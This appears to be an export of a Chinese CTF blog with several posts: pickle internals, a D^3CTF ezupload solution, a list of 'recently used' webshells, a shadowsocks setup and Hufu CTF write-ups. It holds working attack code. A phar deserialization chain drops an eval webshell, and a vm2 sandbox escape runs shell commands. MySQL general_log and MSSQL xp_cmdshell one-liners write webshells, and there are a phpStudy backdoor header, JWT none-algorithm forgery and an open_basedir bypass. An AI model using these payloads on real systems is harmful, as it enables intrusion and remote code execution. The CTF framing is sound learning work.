<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">pickle.__file__<span class="comment"># 查看pickle源码位置</span></span><br></pre></td></tr></table></figure>

<p>pickle.loads是一个供我们调用的接口。其底层实现是基于_Unpickler类。代码实现如下<br><img src="/2020/03/12/初学Python-PIckle/1.png" alt><br>再看<code>_Unpickler</code>的源码，好像是对栈的一些操作，俺也看不太懂，溜了溜了</p>
<h2><span id="pickletools调试">pickletools调试</span></h2><h3><span id="基本操作">基本操作</span></h3><p>pickletools是python自带的pickle调试器，有三个功能：<br><code>pickletools.dis(pickle, out=None, memo=None, indentlevel=4)</code>反汇编一个已经被打包的字符串、<br><code>pickletools.optimize(picklestring)</code>优化一个已经被打包的字符串、<br><code>pickletools.genops(pickle)</code>返回一个迭代器来供程序使用。<br><img src="/2020/03/12/初学Python-PIckle/2.png" alt><br>反汇编结果中，BINPUT指令没有了,所谓“优化”，其实就是把不必要的PUT指令给删除掉。这个PUT意思是把当前栈的栈顶复制一份，放进储存区,我们并不需要这个操作，可以省略掉这些PUT指令.</p>
<h3><span id="pickle语法严格-向前兼容">pickle：语法严格、向前兼容</span></h3><p>pickle构造出的字符串，有很多个版本。在pickle.loads时，可以用Protocol参数指定协议版本，例如指定为0号版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.text = <span class="string">"admin"</span></span><br><span class="line">        self.data = <span class="number">123456</span></span><br><span class="line">        self.dir = [<span class="string">"CTF"</span>,<span class="string">"egg"</span>,<span class="string">"dkk"</span>]</span><br><span class="line">payload = test()</span><br><span class="line">dumps = (pickle.dumps(payload,protocol=<span class="number">0</span>))</span><br><span class="line">dumps = pickletools.optimize(dumps)</span><br><span class="line">pickletools.dis(dumps)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'ccopy_reg\n_reconstructor\np0\n(c__main__\ntest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVtext\np6\nVadmin\np7\nsVdata\np8\nI123456\nsVdir\np9\n(lp10\nVCTF\np11\naVegg\np12\naVdkk\np13\nasb.'</span></span><br></pre></td></tr></table></figure>

<p>可以看到与上面的序列化结果(默认版本号：3)有所区别<br><img src="/2020/03/12/初学Python-PIckle/3.png" alt><br>0号起码还是可读的，之后的版本加入了一大堆不可打印字符<br><img src="/2020/03/12/初学Python-PIckle/4.png" alt><br><strong>pickle协议是向前兼容的</strong><br>所以可以使用0号版本的字符串可以直接交给<code>pickle.loads()</code></p>
<h3><span id="举一个">举一个🌰</span></h3><p><img src="/2020/03/12/初学Python-PIckle/5.png" alt><br>第一个字节<code>\x80 源码注释#identify pickle protocol</code>机器看到这个操作符，立刻再去字符串读取一个字节，得到<code>\x03</code>。解释为“这是一个3号协议序列化的字符串”。<br>第二个字节<code>c</code>它连续读取两个字符串module和name（用<code>\n</code>分割）,接下来把module.name这个东西压进栈。我们这里就是把<code>__main__.test</code>放进栈里<br>第三个字节<code>)</code> push empty tuple<br>第四个字节<code>\x81</code> 从栈中先弹出一个元素，记为args；再弹出一个元素，记为cls。接下来，执行<code>cls.__new__(cls, *args)</code>，然后把得到的东西进栈，也就是我们实例化的对象<code>test</code>放进栈<br>第五个字节<code>}</code>push empty dict<br>第六个字节<code>X</code>counted UTF-8 string argument<br>第七个字节<code>]</code>push empty list 把当前栈这个整体，作为一个list，压进前序栈,把当前栈清空。这个操作也叫<code>load_mark</code><br>与它相反的另一个操作<code>pop_mark</code><br><code>X K</code>按照传入的类型执行进栈的操作<br><code>e</code>目前的<br><code>s</code>向dict添加key+value<br><code>b</code>把当前栈栈顶存进state，然后弹掉,把当前栈栈顶记为inst，然后弹掉,利用state这一系列的值来更新实例inst。把得到的对象扔进当前栈.</p>
<h3><span id="reduce-利用"><strong>reduce</strong> 利用</span></h3><p><code>class</code>的<code>__reduce__</code>方法，在<code>pickle</code>反序列化的时候会被执行。其底层的编码方法，就是利用了<code>R</code>指令码<br><img src="/2020/03/12/初学Python-PIckle/6.png" alt><br><img src="/2020/03/12/初学Python-PIckle/7.png" alt><br>下面这个里面没有<strong>reduce</strong>方法</p>
<h3><span id="例题高校公益赛webtmp">例题：高校公益赛webtmp</span></h3><p>彻底过滤了R指令码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>复现2019D^3CTF_Web</title>
    <url>/2020/04/05/%E5%A4%8D%E7%8E%B02019D-3CTF-Web/</url>
    <content><![CDATA[<h1><span id="复现2019d3ctf_web">复现2019D^3CTF_Web</span></h1><p>当初做的时候就贼怂，在许多地方卡了，现在来学习一下</p>
<!-- toc -->

<ul>
<li><a href="#ezupload">ezupload</a><ul>
<li><a href="#上传htaccess">上传.htaccess</a></li>
<li><a href="#爆破目录">爆破目录</a><ul>
<li><a href="#预期解">预期解</a></li>
<li><a href="#非预期">非预期</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h2><span id="ezupload">ezupload</span></h2><p>给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    phpinfo();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="上传htaccess">上传.htaccess</span></h3><p><code>checkext()</code>过滤了php的一些后缀<code>.php .php5 .php4 .php3 .php2 .phtml .pht</code>可以想到用<code>.htaccess</code>配置文件来绕过，但是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又检查了文件内容<code>SetHandler application/x-httpd-php</code> 这种直接被过滤了<br>可以使用<code>AddHandler php7-script .xxx</code>绕过<br><img src="/2020/04/05/复现2019D-3CTF-Web/1.png" alt><br><img src="/2020/04/05/复现2019D-3CTF-Web/2.png" alt><br>现在可以解析<code>.txt</code>文件了，<br>有两处地方有<code>file_put_contents()</code>可以上传文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上面那个过滤了太多<br>下面那个可以利用phar来上传任意内容的<code>.txt</code>文件<br>upload()里file_get_contents()也可以触发phar<br>还有个小细节<br><img src="/2020/04/05/复现2019D-3CTF-Web/3.png" alt><br>在<code>__destruct()</code>里上传文件我们要知道网站根目录</p>
<h3><span id="爆破目录">爆破目录</span></h3><h4><span id="预期解">预期解</span></h4><p><code>action=count&amp;url=1&amp;filename=1&amp;dir=glob:///var/www/html/*/upload/164e576d567fd233baf2c7110bxxxxx/*</code><br>可以使用<code>glob</code>协议爆破文件目录</p>
<h4><span id="非预期">非预期</span></h4><p>通过上传phar文件调用<code>__toString()</code>里的<code>return implode(&quot; &quot;,scandir(__DIR__.&quot;/&quot;.$this-&gt;userdir));</code>来读取目录<br>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line">$d1 = <span class="keyword">new</span> dir(<span class="string">"test"</span>, <span class="string">"testdd"</span>);</span><br><span class="line">$d1-&gt;userdir = <span class="string">'../'</span>;</span><br><span class="line">$d2 = <span class="keyword">new</span> dir(<span class="string">"url"</span>, <span class="string">"filename"</span>);</span><br><span class="line">$d2-&gt;filename = <span class="string">"upload/164e576d567fd233baf2c7110b954cfd/test3"</span>;</span><br><span class="line">$d2-&gt;userdir = $d1;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">" __HALT_COMPILER(); "</span>);</span><br><span class="line">$phar-&gt;setMetadata($d2);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>,<span class="string">"test"</span>); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>运行后生成phar文件，将phar文件进行gzip压缩<br>把压缩后的.phar.gz文件放到自己vps下<br><img src="/2020/04/05/复现2019D-3CTF-Web/4.png" alt><br><img src="/2020/04/05/复现2019D-3CTF-Web/5.png" alt><br>再写shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> dir(<span class="string">"url"</span>, <span class="string">"filename"</span>);</span><br><span class="line">$a-&gt;filename = <span class="string">'/var/www/html/35adf1ae7eb57341/upload/164e576d567fd233baf2c7110b954cfd/dkk'</span>;</span><br><span class="line">$a-&gt;userdir = <span class="string">'&lt;?php eval($_REQUEST[122]); phpinfo();'</span>;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'1.phar'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span> . <span class="string">" __HALT_COMPILER(); "</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>拿到shell之后有<code>open_basedir</code>和<code>disable_functions</code>蚁剑插件直接过了<br>或者<br><code>chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&#39;/&#39;));</code></p>
]]></content>
  </entry>
  <entry>
    <title>最近使用的WebShell</title>
    <url>/2019/10/22/%E6%9C%80%E8%BF%91%E4%BD%BF%E7%94%A8%E7%9A%84WebShell/</url>
    <content><![CDATA[<h1><span id="最近使用的webshell">最近使用的WebShell</span></h1><h3><span id="phpmyadmin要知道网站目录结构">phpmyadmin（要知道网站目录结构</span></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">'D:/webshell/www/cmd.php'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure>

<h3><span id="html课">html课</span></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 1;RECONFIGURE;</span></span><br><span class="line"><span class="string">exec master..xp_cmdshell '</span>echo <span class="string">"&lt;%eval request("</span>pass<span class="string">")%&gt;"</span> &gt;c:\\inetpub\\wwwroot\\<span class="number">1.</span>asp<span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>Ps:html老师的是个憨憨</p>
<h3><span id="phpstudy后门">phpStudy后门</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-charset: cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>某s搭建</title>
    <url>/2019/09/20/%E6%9F%90s%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1><span id="某s搭建">某s搭建</span></h1><p>国外服务器的购买<br>我买的<code>Vultr</code><br>运行下列命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line">./shadowsocks.sh</span><br></pre></td></tr></table></figure>

<p>分别填入密码，端口，加密方式，然后回车等待</p>
]]></content>
  </entry>
  <entry>
    <title>虎符CTF_Web_Wp</title>
    <url>/2020/04/19/%E8%99%8E%E7%AC%A6CTF-Web-Wp/</url>
    <content><![CDATA[<h1><span id="虎符ctf_web_wp">虎符CTF_Web_Wp</span></h1><h2><span id="前言">前言</span></h2><p>菜鸡太菜了，最近都是node的题，写Wp来记录一下</p>
<h2><span id="easy_login">easy_login</span></h2><p>在<code>/controllers/api.js</code>下找到逻辑源码<br>登陆到<code>admin</code>用户就可拿到<code>flag</code>，但是不让注册<code>admin</code>,而且jwt的密钥长36位，不能爆破。<br>jwt的常见攻击手法：<br>当用户传入jwt 密钥为空时<code>jsonwebtoken</code>会采用<code>algorithm none</code>进行解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">flag = jwt.encode(&#123;<span class="string">"secretid"</span>:<span class="string">""</span>,<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>随便注册一个，然后登陆<code>admin``123456</code><br><img src="/2020/04/19/虎符CTF-Web-Wp/1.png" alt><br>访问<code>/api/flag</code>拿到flag</p>
<h2><span id="just_escape">just_escape</span></h2><p>还是node,惨兮兮<br><code>Error.stack</code>可能是VM2沙盒<br><a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">"""(function()&#123;</span></span><br><span class="line"><span class="string">    try&#123;</span></span><br><span class="line"><span class="string">Buffer.from(new Proxy(&#123;&#125;, &#123; getOwnPropertyDescriptor()&#123;</span></span><br><span class="line"><span class="string">throw f=&gt;f.constructor("return process")(); &#125;</span></span><br><span class="line"><span class="string">        &#125;));</span></span><br><span class="line"><span class="string">    &#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">        return e(()=&gt;&#123;&#125;).mainModule.require("child_process").execSync("cat /flag").toString();</span></span><br><span class="line"><span class="string">&#125; &#125;)()"""</span></span><br><span class="line">r = requests.get(<span class="string">'http://846e204ebe504c619bf5bb6387cb02734daeea7f873840ef.changame.ichunqiu.com/run.php?code[]='</span>+payload) </span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h2><span id="babyupload-之后复现咕咕咕">babyupload   之后复现（咕咕咕</span></h2><p>两部分一个上传一个下载<br>需要伪造admin拿到flag<br>那就伪造session<br>通过下载<code>direction=download&amp;filename=sess_77bc2fc482ff772b893185d04cab988f</code><br>可以知道我们的<code>session</code>的内容<code>usernames:5:&quot;guest&quot;;</code><br>所以我们先上传文件名为<code>sess</code>的文件<code>usernames:5:&quot;admin&quot;;</code><br>然后把我们的<code>SESSION_ID</code>改为<code>sess_[sha256(文件内容)]</code>就可成为<code>admin</code></p>
]]></content>
  </entry>
  <entry>
    <title>[高校战“疫”网络安全分享赛] 部分WriteUp</title>
    <url>/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%81%94%E8%B5%9B%E9%83%A8%E5%88%86Writeup/</url>
    <content><![CDATA[<h1><span id="高校战疫网络安全分享赛-部分writeup">[高校战“疫”网络安全分享赛] 部分WriteUp</span></h1><p>[TOC]</p>
<!-- toc -->

<ul>
<li><a href="#前言">前言</a></li>
<li><a href="#hackme">Hackme</a><ul>
<li><a href="#session反序列化">Session反序列化</a></li>
<li><a href="#bypass-url">Bypass $url</a></li>
</ul>
</li>
<li><a href="#php-uaf">PHP-UAF</a></li>
<li><a href="#webct">webct</a></li>
<li><a href="#sqlcheckin">sqlcheckin</a></li>
</ul>
<!-- tocstop -->

<h2><span id="前言">前言</span></h2><p>我太菜了，记录一下Web题目</p>
<h2><span id="hackme">Hackme</span></h2><p><code>http://121.36.222.22:88/?page=index</code><br>看到链接还想会不会是目录穿越任意文件读取什么的还试了试<code>../../../../flag</code>，俺果然是菜鸡</p>
<h3><span id="session反序列化">Session反序列化</span></h3><p>扫目录<code>www.zip</code>拿到源码<br>审计源码，没有看到执行命令或者输出flag的地方<br>init.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//初始化整个页面</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//lib.php包括一些常见的函数</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p><code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>猜测可能是<a href="https://www.freebuf.com/column/199220.html" target="_blank" rel="noopener">Session反序列化</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/82703639" target="_blank" rel="noopener">四个实例递进php反序列化漏洞理解</a><br>需要找到<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>巧了在<code>upload_sign.php</code>找到了，<br>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line">&#125;</span><br><span class="line">$info = <span class="keyword">new</span> info();</span><br><span class="line">$info -&gt; admin = <span class="number">1</span>;</span><br><span class="line">$info -&gt; sign = <span class="string">'1'</span>;</span><br><span class="line">var_dump(serialize($info));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意，POST时前面有一个<code>|</code>，后面的数据，在储存时就会加上键名进行序列化，但是进行读取的时候还是会按照php handler来处理，以<code>|</code>作为键和值的分隔符，将前半部分当作键，后半部分当作值,然后进行反序列化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Url:http://121.36.222.22:88/upload_sign.php</span><br><span class="line">Post:sign=|O:4:&quot;info&quot;:2:&#123;s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>然后访问<code>./core/index.php</code>就发现又出来一堆代码，Web届的套娃</p>
<h3><span id="bypass-url">Bypass $url</span></h3><p>index.php</p>
